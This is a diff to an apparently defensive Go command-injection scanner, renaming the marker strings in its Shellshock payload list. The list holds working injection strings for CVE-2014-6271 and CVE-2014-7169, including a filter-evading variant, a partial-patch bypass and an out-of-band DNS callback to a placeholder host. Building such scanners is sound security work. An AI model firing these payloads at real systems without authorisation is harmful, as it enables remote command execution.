@@ -15,13 +15,13 @@ package cmdi
 
 var shellshockPayloads = []Payload{
 	// Canonical CVE-2014-6271 — empty function then `;` + arbitrary cmd.
-	{Value: "() { :;}; echo ASSAY_SHELLSHOCK", Platform: PlatformLinux, Type: TypeDirect, Description: "Shellshock CVE-2014-6271 reflective echo probe"},
+	{Value: "() { :;}; echo VIGIL_SHELLSHOCK", Platform: PlatformLinux, Type: TypeDirect, Description: "Shellshock CVE-2014-6271 reflective echo probe"},
 	// Time-based confirmation.
 	{Value: "() { :;}; /bin/sleep 5", Platform: PlatformLinux, Type: TypeTimeBased, Description: "Shellshock time-based sleep"},
 	// Command-substitution variant — survives some filters that strip `;`.
-	{Value: "() { :;}; $(echo ASSAY_SHELLSHOCK)", Platform: PlatformLinux, Type: TypeDirect, Description: "Shellshock $(...) substitution variant"},
+	{Value: "() { :;}; $(echo VIGIL_SHELLSHOCK)", Platform: PlatformLinux, Type: TypeDirect, Description: "Shellshock $(...) substitution variant"},
 	// CVE-2014-7169 — parser bug that triggers even after Patch #1.
-	{Value: "() { (a)=>\\ ; echo ASSAY_SHELLSHOCK", Platform: PlatformLinux, Type: TypeDirect, Description: "Shellshock CVE-2014-7169 partial-patch bypass"},
+	{Value: "() { (a)=>\\ ; echo VIGIL_SHELLSHOCK", Platform: PlatformLinux, Type: TypeDirect, Description: "Shellshock CVE-2014-7169 partial-patch bypass"},
 	// OOB DNS probe — bash → host → DNS resolution against attacker.
 	{Value: "() { :;}; /bin/bash -c \"/usr/bin/host {OAST_HOST}\"", Platform: PlatformLinux, Type: TypeBlind, Description: "Shellshock OOB DNS exfil (host)"},
 	// OOB HTTP probe — curl callback when /usr/bin/curl exists.
